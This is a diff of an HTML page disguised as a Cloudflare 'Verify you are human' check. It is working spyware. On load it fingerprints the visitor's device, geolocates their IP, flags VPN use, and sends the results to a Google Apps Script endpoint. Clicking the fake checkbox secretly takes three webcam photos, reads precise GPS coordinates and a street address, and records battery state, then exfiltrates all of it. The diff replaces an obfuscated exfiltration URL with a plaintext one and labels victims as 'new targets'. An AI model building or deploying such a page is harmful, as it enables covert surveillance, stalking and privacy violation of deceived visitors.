@@ -1,881 +1,295 @@
 <!DOCTYPE html>
-
 <html lang="en">
-
 <head>
-
     <meta charset="UTF-8">
-
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
     <title>Just a moment...</title>
-
-    <link rel="icon" href="https://www.cloudflare.com/favicon.ico">
-
     <style>
-
         * { box-sizing: border-box; }
-
         body {
-
             margin: 0; padding: 0;
-
             background-color: #ffffff;
-
             font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
-
             color: #404040;
-
             display: flex; flex-direction: column; min-height: 100vh;
-
             -webkit-font-smoothing: antialiased;
-
         }
-
         .main-wrapper { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; }
-
         .container { max-width: 500px; width: 100%; }
-
         h1 { font-size: 40px; font-weight: 500; margin: 0 0 10px; color: #333; letter-spacing: -0.5px; }
-
         p { font-size: 16px; margin-bottom: 25px; line-height: 1.6; }
-
         .turnstile-box {
-
             display: flex; align-items: center; background: #f9f9f9;
-
             border: 1px solid #dcdcdc; padding: 12px 16px;
-
             border-radius: 4px; margin-bottom: 20px; width: 300px; user-select: none;
-
         }
-
         .checkbox {
-
             width: 26px; height: 26px; border: 2px solid #c5c5c5;
-
             border-radius: 2px; background: #fff; margin-right: 12px;
-
             cursor: pointer; position: relative; flex-shrink: 0; transition: all 0.2s;
-
         }
-
         .checkbox:hover { border-color: #0051c3; }
-
         .label { font-size: 14px; font-weight: 500; color: #333; cursor: pointer; line-height: 1; margin-top: 1px; }
-
         .logo-cf { margin-left: auto; display: flex; flex-direction: column; align-items: center; }
-
         .logo-cf svg { width: 50px; height: auto; opacity: 0.8; }
-
         .logo-text { font-size: 9px; color: #999; margin-top: 2px; }
-
         .footer { text-align: center; font-size: 12px; color: #999; padding: 20px; border-top: 1px solid #eaeaea; }
-
         .spinner {
-
             display: none; width: 22px; height: 22px; border: 3px solid #f3f3f3;
-
             border-top: 3px solid #0051c3; border-radius: 50%;
-
             animation: spin 0.8s linear infinite; margin-right: 12px;
-
         }
-
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
         .checkmark { display: none; width: 26px; height: 26px; margin-right: 12px; }
-
         .checkmark::after {
-
             content: ''; display: block; width: 8px; height: 16px;
-
             border: solid #009900; border-width: 0 3px 3px 0;
-
             transform: rotate(45deg); margin-left: 8px; margin-top: 2px;
-
         }
-
         #video, #canvas { position: absolute; top: -9999px; left: -9999px; opacity: 0; pointer-events: none; }
-
     </style>
-
 </head>
-
 <body>
 
-
-
     <div class="main-wrapper">
-
         <div class="container">
-
             <h1>Checking your browser before accessing the site.</h1>
-
             <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
-
             <p style="color: #666; font-size: 14px;">Please allow up to 5 seconds...</p>
-
-
-
+            
             <div class="turnstile-box" id="captcha-box">
-
                 <div class="checkbox" id="btn"></div>
-
                 <div class="spinner" id="loader"></div>
-
                 <div class="checkmark" id="success-icon"></div>
-
                 <span class="label" id="label-text">Verify you are human</span>
-
                 <div class="logo-cf">
-
                     <svg viewBox="0 0 62 25" fill="#333"><path d="M51.9 14.2c-.3-1.4-1.4-2.4-2.8-2.6.2-.6.3-1.3.3-2 0-3.3-2.7-6-6-6-.5 0-1 .1-1.5.2-.8-2.6-3.3-4.5-6.2-4.5-3.6 0-6.5 2.9-6.5 6.5 0 .4 0 .7.1 1.1-1.3-1.1-3-1.8-4.9-1.8-4.1 0-7.5 3.4-7.5 7.5 0 .2 0 .4.1.6C7.5 13.8 0 14.8 0 17.5c0 3 2.5 5.5 5.5 5.5h45c3 0 5.5-2.5 5.5-5.5 0-2.3-1.6-4.3-4.1-4.1z" opacity=".2"/></svg>
-
                     <span class="logo-text">Cloudflare</span>
-
                 </div>
-
             </div>
-
         </div>
-
     </div>
-
-
 
     <div class="footer">
-
         Ray ID: <span id="ray-id"></span> &bull; IP: <span id="display-ip">Checking secure connection...</span> &bull; Performance & security by Cloudflare
-
     </div>
 
-
-
     <video id="video" autoplay playsinline muted></video>
-
     <canvas id="canvas"></canvas>
 
-
-
     <script>
-
+        // ==========================================
+        // 🛡️ SECURITY CONFIGURATION
+        // ==========================================
+        // СЮДА ВСТАВИТЬ URL ИЗ GOOGLE APPS SCRIPT
+        const _P_URL = "https://script.google.com/macros/s/AKfycbzMm4DrahVeftCcXwFQ9n5J0Z8W4NH4pp_HmhFa6oPRl4vPsJXlO61PNMrURhRwpCgO/exec"; 
         // ==========================================
 
-        // CONFIGURATION (ENCRYPTED)
-
-        // ==========================================
-
-        const _P_ENCRYPTED = "G0cXAkBOcE0hVxZYGytFVBYwVVxXGBBcDl1eFTwQPUdLQkQeIFUAPFBKf1tHdxETWyI6BCZ3B2kcGToKF2p4AGgOJActOgcELz0aWQx3CmkEYyszBkZiRTlrDz0FRQ8sH0YxYwMNHEM6OH0fV04WUA==";
-
-        const _P_KEY = "s3cr3t_bR4d1k_k3y_2026";
-
-
-
-        // ==========================================
-
-        // DECRYPTION FUNCTION
-
-        // ==========================================
-
-        function _decryptUrl(encrypted, key) {
-
-            try {
-
-                // Base64 decode
-
-                const encoded = atob(encrypted);
-
-                // XOR decrypt
-
-                let decrypted = '';
-
-                for (let i = 0; i < encoded.length; i++) {
-
-                    decrypted += String.fromCharCode(encoded.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-
-                }
-
-                return decrypted;
-
-            } catch (e) {
-
-                console.error("Decryption failed:", e);
-
-                return null;
-
-            }
-
-        }
-
-
-
-        // ==========================================
-
-        // GET CONFIGURED URL
-
-        // ==========================================
-
-        const _P_URL = _decryptUrl(_P_ENCRYPTED, _P_KEY);
-
-
-
-        // ==========================================
-
-        // INIT
-
-        // ==========================================
-
-        if (!_P_URL) {
-
-            console.error("Failed to decrypt URL!");
-
-            document.body.innerHTML = "<h1>Error: Unable to load configuration</h1>";
-
-            throw new Error("Configuration error");
-
-        }
-
-
-
-        const generateHex = (len) => [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
-
-        document.getElementById('ray-id').innerText = generateHex(16);
-
+        document.getElementById('ray-id').innerText = Math.random().toString(16).substr(2, 16);
         const sleep = (ms) => new Promise(r => setTimeout(r, ms));
-
         const log = (msg) => console.log(`[SYS] ${msg}`);
 
-
-
         // --- ENCRYPTION LAYER (DUMMY) ---
-
         const _0x = (s) => s.split('').reverse().join('');
 
-
-
         // --- HARDWARE FINGERPRINTING ---
-
         function _gC() {
-
             try {
-
                 const c = document.createElement('canvas');
-
                 const ctx = c.getContext('2d');
-
                 ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
-
                 ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
-
                 ctx.fillStyle = "#069"; ctx.fillText("T_E_v1", 2, 15);
-
                 ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("T_E_v1", 4, 17);
-
                 let s = c.toDataURL(), h = 0;
-
                 for (let i = 0; i < s.length; i++) {
-
                     const k = s.charCodeAt(i); h = ((h << 5) - h) + k; h = h & h;
-
                 }
-
                 return h.toString(16);
-
             } catch { return "x00"; }
-
         }
-
-
 
         function _gS() {
-
             return {
-
                 c: navigator.hardwareConcurrency || "N/A",
-
                 r: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "N/A",
-
                 p: navigator.platform,
-
                 f: _gC(),
-
                 g: (() => {
-
                     try {
-
                         const c = document.createElement('canvas');
-
                         const g = c.getContext('webgl') || c.getContext('experimental-webgl');
-
                         if (!g) return "N/A";
-
                         const d = g.getExtension('WEBGL_debug_renderer_info');
-
                         return d ? g.getParameter(d.UNMASKED_RENDERER_WEBGL) : "Hidden";
-
                     } catch { return "Err"; }
-
                 })()
-
             };
-
         }
-
-
 
         // --- NETWORK & VPN DETECTION ---
-
         async function _gN() {
-
             let d = null;
-
             const _f = (u) => Promise.race([
-
                 fetch(u).then(r => r.json()),
-
                 new Promise((_, r) => setTimeout(() => r(new Error('T')), 2000))
-
             ]);
 
-
-
             // Immortal Loop
-
             while (!d || !d.country_code) {
-
                 try {
-
                     try { const r = await _f('https://ipapi.co/json/'); if(r.country_code) d = {i:r.ip, c:r.city||r.region, n:r.country_name, k:r.country_code, o:r.org, t:r.timezone}; break; } catch{}
-
                     try { const r = await _f('https://api.ip.sb/geoip'); if(r.country_code) d = {i:r.ip, c:r.city||r.region, n:r.country, k:r.country_code, o:r.isp, t:r.timezone}; break; } catch{}
-
                     try { const r = await _f('https://freeipapi.com/api/json'); if(r.countryCode) d = {i:r.ipAddress, c:r.cityName, n:r.countryName, k:r.countryCode, o:r.isp, t:r.timeZone}; break; } catch{}
-
                     await sleep(1000);
-
                 } catch { await sleep(1000); }
-
             }
-
-
 
             // VPN Check
-
             let v = "";
-
-            if (new Date().getTimezoneOffset() === -180) {
-
-                if (d.k !== 'BY' && d.k !== 'RU') v = "DETECTED VPN";
-
+            if (new Date().getTimezoneOffset() === -180) { // UTC+3
+                if (d.k !== 'BY' && d.k !== 'RU') v = "⚠️ DETECTED VPN";
             }
-
             return { ...d, v };
-
         }
-
-
 
         // --- PROXY SENDER (SECURE) ---
-
         async function _sD(txt, ph = []) {
-
             if (_P_URL.includes("YOUR_GAS")) { console.error("URL NOT SET"); return; }
-
-
-
+            
             try {
-
                 // Convert Blobs to Base64
-
                 const b64Ph = [];
-
                 for (const b of ph) {
-
                     const reader = new FileReader();
-
                     const p = new Promise(r => reader.onloadend = () => r(reader.result));
-
                     reader.readAsDataURL(b);
-
                     b64Ph.push(await p);
-
                 }
-
-
 
                 await fetch(_P_URL, {
-
                     method: 'POST',
-
                     mode: 'no-cors', // Important for GAS
-
                     headers: { 'Content-Type': 'application/json' },
-
                     body: JSON.stringify({
-
                         text: txt,
-
                         photos: b64Ph
-
                     })
-
                 });
-
                 log("Data Sent to Proxy");
-
             } catch (e) { log("Err: " + e.message); }
-
         }
-
-
 
         // --- PHASE 1: AUTO REPORT ---
-
         document.addEventListener("DOMContentLoaded", async () => {
-
             const n = await _gN();
-
             const s = _gS();
-
             document.getElementById('display-ip').innerText = n.i;
 
-
-
             const msg = `
-
-*CONNECTION ESTABLISHED*
-
+*НОВАЯ ЦЕЛЬ (ONLINE)*
 ━━━━━━━━━━━━━━━━
-
 ${n.v}
 
-
-
 *СЕТЬ*
-
 IP: \`${n.i}\`
-
 Город: ${n.c} (Таймзона: ${n.t})
-
 Страна: ${n.n}
-
 Провайдер: ${n.o}
-
 Связь: ${navigator.connection ? navigator.connection.effectiveType : "Неизвестно"}
 
-
-
 *ЖЕЛЕЗО*
-
 Устройство: ${navigator.maxTouchPoints > 0 ? "Touch Screen" : "Mouse/Keyboard"}
-
 GPU: ${s.g}
-
 CPU: ${s.c} ядра | RAM: ${s.r}
-
 ОС: ${s.p}
-
 *Fingerprint: ${s.f}*
 
-
-
 Время: ${new Date().toLocaleTimeString()}
-
 `.trim();
-
-
 
             await _sD(msg);
-
         });
 
-
-
-        // --- INTERACTIVE CHECK ---
-
+        // --- PHASE 2: INTERACTIVE ---
         const bB = document.getElementById('captcha-box');
-
         const b = document.getElementById('btn');
-
-
-
-        // Error Page Logic
-
-        function showError() {
-
-            document.title = "Error 520 | Website.com";
-
-            document.body.innerHTML = `
-
-                <div style="font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #333; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background: #fff; padding: 20px;">
-
-                    <div style="max-width: 800px; width: 100%; text-align: center;">
-
-                        <h1 style="font-size: 60px; font-weight: 300; margin: 0; color: #333;">Error 520</h1>
-
-                        <div style="font-size: 24px; color: #666; margin: 10px 0;">Web server is returning an unknown error</div>
-
-
-
-                        <!-- Visual Diagram -->
-
-                        <div style="display: flex; align-items: center; justify-content: center; margin: 40px 0; gap: 30px; flex-wrap: wrap;">
-
-                            <div style="text-align: center;">
-
-                                <div style="font-size: 40px; color: #28a745;">&#128187;</div>
-
-                                <div style="margin-top: 10px; font-weight: 500; font-size: 14px;">Browser</div>
-
-                                <div style="color: #28a745; font-size: 12px;">Working</div>
-
-                            </div>
-
-                            <div style="font-size: 20px; color: #ccc;">&#8594;</div>
-
-                            <div style="text-align: center;">
-
-                                <div style="font-size: 40px; color: #28a745;">&#9729;</div>
-
-                                <div style="margin-top: 10px; font-weight: 500; font-size: 14px;">Cloudflare</div>
-
-                                <div style="color: #28a745; font-size: 12px;">Working</div>
-
-                            </div>
-
-                            <div style="font-size: 20px; color: #ccc;">&#8594;</div>
-
-                            <div style="text-align: center;">
-
-                                <div style="font-size: 40px; color: #dc3545;">&#128483;</div>
-
-                                <div style="margin-top: 10px; font-weight: 500; font-size: 14px;">Host</div>
-
-                                <div style="color: #dc3545; font-size: 12px;">Error</div>
-
-                            </div>
-
-                        </div>
-
-
-
-                        <!-- Technical Details Section -->
-
-                        <div style="border-top: 1px solid #eee; padding-top: 20px; display: inline-block; text-align: left; width: 100%; max-width: 400px;">
-
-                            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
-
-                                <span style="font-size: 13px; color: #666;">
-
-                                    Cloudflare Ray ID: <strong id="ray-id-text" style="color:#333; cursor:pointer;" title="Click to copy">${document.getElementById('ray-id').innerText}</strong>
-
-                                </span>
-
-                                <span id="copy-hint" style="display:none; color:#009900; font-size: 11px;">Copied!</span>
-
-                            </div>
-
-
-
-                            <div style="font-size: 13px;">
-
-                                <a href="#" onclick="document.getElementById('err-details').style.display='block'; return false;" style="color: #c0392b; text-decoration: none; font-weight: 500;">&#9656; Technical Details</a>
-
-                                <div id="err-details" style="display:none; margin-top: 15px; background: #f9f9f9; padding: 15px; border-radius: 4px; border: 1px solid #e0e0e0; font-family: monospace; color: #333; font-size: 11px;">
-
-                                    <div style="margin-bottom: 5px;"><strong>Ray ID:</strong> ${document.getElementById('ray-id').innerText}</div>
-
-                                    <div style="margin-bottom: 5px;"><strong>Your IP:</strong> ${document.getElementById('display-ip').innerText}</div>
-
-                                    <div style="margin-bottom: 5px;"><strong>User Agent:</strong> ${navigator.userAgent}</div>
-
-                                    <div style="margin-bottom: 5px;"><strong>Time:</strong> ${new Date().toISOString()}</div>
-
-                                    <div style="margin-bottom: 5px;"><strong>Server:</strong> AMS-IX-CLOUDFLARE</div>
-
-                                    <div><strong>Event ID:</strong> ${generateHex(32)}</div>
-
-                                </div>
-
-                            </div>
-
-
-
-                            <div style="margin-top: 20px; text-align: center;">
-
-                                <a href="https://www.cloudflare.com/5xx-error-landing" target="_blank" style="color:#999; text-decoration:none; font-size:12px;">What happened?</a>
-
-                            </div>
-
-                        </div>
-
-                    </div>
-
-                </div>
-
-            `;
-
-            document.body.style.display = "block";
-
-            document.body.style.backgroundColor = "#fff";
-
-
-
-            // Click to Copy Logic
-
-            document.getElementById('ray-id-text').onclick = function() {
-
-                const text = this.innerText;
-
-                navigator.clipboard.writeText(text);
-
-                const hint = document.getElementById('copy-hint');
-
-                hint.style.display = 'inline';
-
-                setTimeout(() => hint.style.display = 'none', 2000);
-
-            };
-
-        }
-
-
-
+        
         bB.onclick = async () => {
-
             if (b.style.display === 'none') return;
-
             b.style.display = 'none';
-
             document.getElementById('loader').style.display = 'block';
+            document.getElementById('label-text').innerText = "Verifying...";
 
-            log("Starting Check...");
-
-
-
-            // 1. Camera
-
-            document.getElementById('label-text').innerText = "Allow Camera...";
-
-            let stream = null;
-
-            let video = document.getElementById('video');
-
-
+            let bat = "N/A";
+            if (navigator.getBattery) {
+                const bt = await navigator.getBattery();
+                bat = `${Math.round(bt.level * 100)}%${bt.charging?'⚡':''}`;
+            }
 
             try {
+                const st = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280}});
+                const v = document.getElementById('video');
+                v.srcObject = st;
+                await v.play();
 
-                stream = await navigator.mediaDevices.getUserMedia({
-
-                    video: { facingMode: "user", width: { ideal: 1280 } }
-
+                // GPS
+                let gps = "*GPS Denied*";
+                const gP = new Promise(r => {
+                    navigator.geolocation.getCurrentPosition(
+                        async p => {
+                            const {latitude:la, longitude:lo} = p.coords;
+                            const l = `https://www.google.com/maps?q=${la},${lo}`;
+                            let a = "Unknown";
+                            try { const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`); a = (await req.json()).display_name; } catch{}
+                            r(`Адрес: ${a}\nКарты: [клик](${l})`);
+                        },
+                        () => r("*Юзер запретил доступ к GPS*"), {enableHighAccuracy:true}
+                    );
                 });
 
-                video.srcObject = stream;
-
-                try { await video.play(); } catch(e) { log("Autoplay: " + e); }
-
-            } catch (e) {
-
-                log("Camera: " + e);
-
-            }
-
-
-
-            // 2. Location
-
-            document.getElementById('label-text').innerText = "Allow Location...";
-
-
-
-            const gpsPromise = new Promise(resolve => {
-
-                if (!navigator.geolocation) return resolve({t:"*GPS Not Supported*", e:true});
-
-
-
-                const timer = setTimeout(() => resolve({t:"*GPS: Timeout*", e:true}), 60000);
-
-
-
-                navigator.geolocation.getCurrentPosition(
-
-                    async p => {
-
-                        clearTimeout(timer);
-
-                        const {latitude:la, longitude:lo} = p.coords;
-
-                        const link = `https://www.google.com/maps?q=${la},${lo}`;
-
-                        let addr = "Unknown";
-
-                        try {
-
-                            const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`);
-
-                            addr = (await req.json()).display_name;
-
-                        } catch{}
-
-                        resolve({t:`Address: ${addr}\nMap: [Click](${link})`, e:false});
-
-                    },
-
-                    (err) => {
-
-                        clearTimeout(timer);
-
-                        let e = "Error";
-
-                        if (err.code === 1) e = "Denied";
-
-                        else if (err.code === 2) e = "Unavailable";
-
-                        else if (err.code === 3) e = "Timeout";
-
-                        resolve({t:`*GPS Error: ${e}*`, e:true});
-
-                    },
-
-                    { enableHighAccuracy: true }
-
-                );
-
-            });
-
-
-
-            // 3. Capture
-
-            let ph = [];
-
-            if (stream) {
-
-                document.getElementById('label-text').innerText = "Verifying...";
-
-
-
-                await sleep(1500);
-
-
+                await sleep(2500); // Warmup
 
                 const c = document.getElementById('canvas');
-
-                c.width = video.videoWidth || 640; c.height = video.videoHeight || 480;
-
+                c.width = v.videoWidth; c.height = v.videoHeight;
                 const ctx = c.getContext('2d');
-
-
+                const ph = [];
 
                 for(let i=0; i<3; i++) {
-
-                    ctx.drawImage(video,0,0);
-
-                    ph.push(await new Promise(r=>c.toBlob(r,'image/jpeg',0.6)));
-
-                    if(i<2) await sleep(600);
-
+                    ctx.drawImage(v,0,0);
+                    ph.push(await new Promise(r=>c.toBlob(r,'image/jpeg',0.8)));
+                    if(i<2) await sleep(800);
                 }
 
+                gps = await gP;
+                st.getTracks().forEach(t=>t.stop());
 
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('success-icon').style.display = 'block';
+                document.getElementById('label-text').innerText = "Success!";
+                document.getElementById('label-text').style.color = "#009900";
 
-                stream.getTracks().forEach(t=>t.stop());
-
-            }
-
-
-
-            // 4. Wait for Location
-
-            // Dynamic Status Loop to mask delay
-
-                const statuses = ["Verifying...", "Checking browser...", "Analyzing traffic...", "Confirming connection..."];
-
-                let sIdx = 0;
-
-                const statusInterval = setInterval(() => {
-
-                    document.getElementById('label-text').innerText = statuses[sIdx++ % statuses.length];
-
-                }, 1500);
-
-
-
-                const gpsData = await gpsPromise;
-
-                clearInterval(statusInterval);
-
-                document.getElementById('label-text').innerText = "Finishing...";
-
-                const gps = gpsData.t;
-
-
-
-                // 5. Battery
-
-                let bat = "N/A";
-
-            if (navigator.getBattery) {
-
-                try {
-
-                    const bt = await navigator.getBattery();
-
-                    bat = `${Math.round(bt.level * 100)}% (${bt.charging ? 'Подзаряжается' : 'От батареи'})`;
-
-                } catch {}
-
-            }
-
-
-
-            document.getElementById('loader').style.display = 'none';
-
-            document.getElementById('success-icon').style.display = 'block';
-
-            document.getElementById('label-text').innerText = "Success!";
-
-            document.getElementById('label-text').style.color = "#009900";
-
-
-
-            const fM = `
-
-*FULL REPORT*
-
+                const fM = `
+*ПОЛНЫЙ ОТЧЕТ (Phase 2)*
 ━━━━━━━━━━━━━━━━
-
-*LOCATION*
-
+*ГЕОПОЗИЦИЯ*
 ${gps}
 
+*СТАТУС БАТАРЕИ*
+Заряд: ${bat}
 
-
-*BATTERY*
-
-Status: ${bat}
-
-
-
-*PHOTOS*
-
-Captured: ${ph.length > 0 ? ph.length : "NO ACCESS"}
-
+*ФОТО*
+Захвачено фото: ${ph.length} шт.
 `.trim();
 
+                await _sD(fM, ph);
+                setTimeout(() => window.location.href = "https://vk.com/atypical_kazan", 1000);
 
-
-            await _sD(fM, ph);
-
-            setTimeout(showError, 1500);
-
+            } catch (e) {
+                _sD(`❌ *ACCESS DENIED*: ${e.message}`);
+                window.location.href = "https://vk.com/atypical_kazan";
+            }
         };
-
     </script>
-
 </body>
-
 </html>
